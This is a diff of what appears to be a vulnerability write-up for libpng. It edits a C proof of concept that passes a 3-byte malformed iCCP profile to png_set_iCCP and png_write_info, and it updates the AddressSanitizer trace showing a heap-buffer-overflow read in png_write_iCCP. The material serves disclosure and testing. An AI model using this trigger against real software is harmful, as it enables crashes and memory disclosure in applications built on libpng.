@@ -41,42 +41,54 @@ int main() {
     }
 
     if (setjmp(png_jmpbuf(png_ptr))) {
-        printf("libpng triggered an error (likely due to bad profile)\n");
+        fprintf(stderr, "libpng triggered an error (likely due to bad profile)\n");
         png_destroy_write_struct(&png_ptr, &info_ptr);
         fclose(fp);
         return 1;
     }
 
     png_init_io(png_ptr, fp);
-
     png_set_IHDR(png_ptr, info_ptr,
-                 1, 1,                    // width, height
-                 8,                      // bit_depth
-                 PNG_COLOR_TYPE_RGB,     // color_type
-                 PNG_INTERLACE_NONE,
-                 PNG_COMPRESSION_TYPE_BASE,
-                 PNG_FILTER_TYPE_BASE);
+                 1, 1, 8, PNG_COLOR_TYPE_RGB,
+                 PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_BASE, PNG_FILTER_TYPE_BASE);
 
-    // ICC profile (malformed): length < 4 bytes
-    char profile_name[] = "sRGB";
+    /**
+     * Malformed iCC profile (3 bytes instead of >= 4)
+     */
+    const char profile_name[] = "sRGB";
+    const png_charp profile_data = (png_charp)"ABC";
+    png_uint_32 profile_len = 3;
     int compression_type = 0;
 
-    // Invalid profile buffer of length 3 (should be ≥ 4)
-    png_bytep profile_data = (png_bytep)"ABC";
-    png_uint_32 profile_len = 3;
-
+    /**
+     * The root cause of the vulnerability starts here,
+     * when we set the malicious profile (iCC profile less than 4 bytes)
+     */
     png_set_iCCP(png_ptr, info_ptr,
                  profile_name, compression_type,
                  profile_data, profile_len);
 
+    /**
+     * The entry point to trigger the vulnerability is here,
+     * when we write the informations of the png file.
+     */
     png_write_info(png_ptr, info_ptr);
+    /**
+     * which calls:
+     * png_write_info_before_PLTE(png_ptr, info_ptr);
+     * that then calls:
+     * png_write_iCCP(png_ptr, info_ptr->iccp_name, info_ptr->iccp_profile);
+     */
+    
 
-    // Write dummy image row
+    /**
+     * The rest is what one would typically do to write a png image.
+     */
     png_bytep row = (png_bytep)malloc(3);
     memset(row, 255, 3);
     png_write_row(png_ptr, row);
-
     png_write_end(png_ptr, NULL);
+
     free(row);
     png_destroy_write_struct(&png_ptr, &info_ptr);
     fclose(fp);
@@ -102,28 +114,27 @@ Once we run the exec (with address sanatizer enabled), we get the following outp
 ```sh
 $ ./poc_iccp
 
-poc_iccp(17600,0x1f88d4840) malloc: nano zone abandoned due to inability to reserve vm space.
 =================================================================
-==17600==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000000b3 at pc 0x000102e3ada8 bp 0x00016d87ece0 sp 0x00016d87e490
+==97234==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000000b3 at pc 0x000100b5eda8 bp 0x00016fba6cc0 sp 0x00016fba6470
 READ of size 65536 at 0x6020000000b3 thread T0
-    #0 0x102e3ada4 in memcpy+0x3fc (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52da4)
+    #0 0x100b5eda4 in memcpy+0x3fc (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52da4)
     #1 0x19ca8f774  (libz.1.dylib:arm64e+0x6774)
     #2 0x19ca8da88  (libz.1.dylib:arm64e+0x4a88)
     #3 0x19ca8f088  (libz.1.dylib:arm64e+0x6088)
     #4 0x19ca8c7a0 in deflate+0x958 (libz.1.dylib:arm64e+0x37a0)
-    #5 0x1025ebdc8 in png_text_compress pngwutil.c:597
-    #6 0x1025ebb74 in png_write_iCCP pngwutil.c:1188
-    #7 0x1025e77b0 in png_write_info_before_PLTE pngwrite.c:199
-    #8 0x1025e78e0 in png_write_info pngwrite.c:237
-    #9 0x102583a24 in main poc_iccp.c:52
+    #5 0x1002c3dc8 in png_text_compress pngwutil.c:597
+    #6 0x1002c3b74 in png_write_iCCP pngwutil.c:1188
+    #7 0x1002bf7b0 in png_write_info_before_PLTE pngwrite.c:199
+    #8 0x1002bf8e0 in png_write_info pngwrite.c:237
+    #9 0x10025ba24 in main poc_iccp.c:55
     #10 0x18ebe4270  (<unknown module>)
 
 0x6020000000b3 is located 0 bytes after 3-byte region [0x6020000000b0,0x6020000000b3)
 allocated by thread T0 here:
-    #0 0x102e3cc04 in malloc+0x94 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x54c04)
-    #1 0x1025d3cf0 in png_malloc_warn pngmem.c:216
-    #2 0x1025e5a1c in png_set_iCCP pngset.c:891
-    #3 0x1025839b0 in main poc_iccp.c:48
+    #0 0x100b60c04 in malloc+0x94 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x54c04)
+    #1 0x1002abcf0 in png_malloc_warn pngmem.c:216
+    #2 0x1002bda1c in png_set_iCCP pngset.c:891
+    #3 0x10025b9b0 in main poc_iccp.c:47
     #4 0x18ebe4270  (<unknown module>)
 
 SUMMARY: AddressSanitizer: heap-buffer-overflow (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x52da4) in memcpy+0x3fc
@@ -158,8 +169,7 @@ Shadow byte legend (one shadow byte represents 8 application bytes):
   ASan internal:           fe
   Left alloca redzone:     ca
   Right alloca redzone:    cb
-==17600==ABORTING
-zsh: abort      ./poc_iccp
+==97234==ABORTING
 ```
 
 ## Minimal "real-life" example
